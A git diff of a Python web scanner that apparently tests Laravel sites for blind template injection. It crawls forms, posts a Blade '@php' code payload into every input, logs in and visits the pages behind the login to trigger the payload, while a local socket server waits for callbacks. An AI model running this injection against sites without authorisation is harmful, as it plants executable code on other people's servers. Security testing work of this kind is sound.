@@ -1,11 +1,10 @@
 import re
 import sys
 from urllib.parse import urlparse
-
+import urllib3.exceptions
+import urllib.request
 import requests
 import subprocess
-import urllib.request
-
 
 
 def get_page_urls(html):
@@ -82,11 +81,9 @@ def post_url(html):
     This function finds all form action links in given html
     """
 
-    post_link = re.findall(r"action=([a-zA-Z0-9 _:;=./\"'\\\\]+)", html)[0]
+    post_link = re.findall(r"action=([a-zA-Z0-9_:;=./\"\-'\\\\]+)", html)[0]
 
-    #for link in post_links:
-    formatted_link = re.findall(r"(http://[a-zA-Z0-9_:;=./\\\\]+)", post_link)[0]
-    #formatted_links.append(formatted_link[0])
+    formatted_link = re.findall(r"(http://[a-zA-Z0-9_:;=./\-\\\\]+)", post_link)[0]
 
     return formatted_link
 
@@ -109,6 +106,7 @@ def get_forms(html):
     form_groups = re.findall(r"(action=[a-zA-Z0-9 _:;=./\"\-<>\s\S'\\\\]+<\/form>)+", html)
     link_groups = {}
     input_count = 0
+
     for group in form_groups:
         action_link = post_url(group)
         input_links, input_count = locate_input_points(group)
@@ -131,27 +129,31 @@ def check_login_form(form_groups, login_page_url):
     return "0", 0, "0", False
 
 
-def check_nested_links(required_links, hostname):
+def check_nested_links(required_links, session, hostname):
     """
     Iterates through collected links and checks for new ones in them
     """
 
     nested_links = []
     for url in required_links:
+        joined_url = url
         try:
-            joined_url = "http://"+hostname+url
-            response = urllib.request.urlopen(joined_url)
-            html = response.read()
+            if (hostname not in joined_url):  # check if the url is not formatted properly
+                joined_url = "http://" + hostname + url
+
+            #response = urllib.request.urlopen(joined_url)
+            response = session.get(joined_url)
+            html = response.text
 
             a_tags = re.findall(r'href="([^"]*)"', str(html))
             vue_urls = re.findall(r'to="([^"]*)"', str(html))
             all_tags = a_tags + vue_urls
+            print("ALL_TAGS: ", all_tags)
 
             for link in all_tags:
                 nested_links.append(link)
         except Exception:
             pass
-
     return nested_links
 
 
@@ -190,17 +192,25 @@ def test_blind_posterior(urls):
         session = requests.session()
         front = session.get(url)
 
+        groups, input_no = get_forms(front.text)
+
+        # Check if we have already been to the login page to avoid overriding the values, also avoid the registration page
+        # if("register" not in front.text):
+        if (login_found == False):
+            login_form_url, login_inputs, login_page_url, login_found = check_login_form(groups, url)
+        else:
+            break
+
+    for url in urls:
         try:
+            session = requests.session()
+            front = session.get(url)
+
             token = get_token(front.text)
             cookies = session.cookies
 
-            post_data = {}
             groups, input_no = get_forms(front.text)
-
-            # Check if we have already been to the login page to avoid overriding the values, also avoid the registration page
-            if("register" not in front.text):
-                if(login_found == False):
-                    login_form_url, login_inputs, login_page_url, login_found = check_login_form(groups, url)
+            post_data = {}
 
 
             for group in groups:
@@ -219,7 +229,14 @@ def test_blind_posterior(urls):
                                               catch(Exception $e){{}}
                                          @endphp"""
                 post_data["_token"] = token  # Add token last
-                requests.post(group, post_data, cookies=cookies)
+
+                req = None
+                try:
+                    req = requests.post(group, data=post_data, cookies=cookies)
+                except (urllib3.exceptions.MaxRetryError, requests.exceptions.ConnectionError):
+                    print(
+                        "Unable to perform test on " + url + " on form link " + group + " as it is an authentication page")
+                    continue
 
         except IndexError:
             continue
@@ -237,7 +254,6 @@ def test_blind_posterior(urls):
     for inpt in login_inputs:  # For each input found in the login form
         blind_data[name_array[input_count]] = val_array[input_count]  # use cred name & val arrays to get inputted names and values
         input_count+=1
-        #  Can validate count of inputs vs inputs received by the user here
 
     blind_session = requests.session()  # Create a blind session
 
@@ -247,25 +263,30 @@ def test_blind_posterior(urls):
     login_token = get_token(login_page.text)  # Extract the form token
     blind_data["_token"] = login_token
 
+    hostname = urlparse(login_form_url).hostname  # Hostname to use later
     login_response = blind_session.post(login_form_url, blind_data, blind_cookies)  # Performing login
 
     # Start up the socket server
-    server_instance = subprocess.Popen(['python', 'SocketServer.py'])# ' '.join(urls)])
+    server_instance = subprocess.Popen(['python', 'SocketServer.py'])
 
     if(login_response.status_code == 200):  # Login successful
         front = login_response.text
         new_urls = get_page_urls(front)
 
-        nested_links = check_nested_links(new_urls)  # Check for links inside the new pages
-        filtered_urls = filter_links(urls + new_urls + nested_links)  # Form a collection of urls we've seen so far and new ones
+        nested_links = check_nested_links(new_urls, blind_session, hostname)  # Check for links inside the new pages
+        #filtered_urls = filter_links(urls + new_urls + nested_links, hostname)  # Form a collection of urls we've seen so far and new ones
+        filtered_urls = filter_links(new_urls + nested_links, hostname)  # Form a collection of urls we've seen so far and new ones
         split_urls = list(filtered_urls.split("|"))  # split the filtered_urls string
-
+        print("FILTEREDURLS: ", filtered_urls)
+        print("SPLITURLS: ", split_urls)
+        input()  #
         to_scan = []
         for unique_url in split_urls:
             if(unique_url not in urls):  # If the current URL is not present in the list of URLs we have already seen
                 to_scan.append(unique_url)
         to_scan.pop(-1)  # Removing the last element as it is an empty string
 
+        print("TOSCAN: ", to_scan)
         for blind_url in to_scan:  # visit URLs
             blind_session.get(blind_url)
 
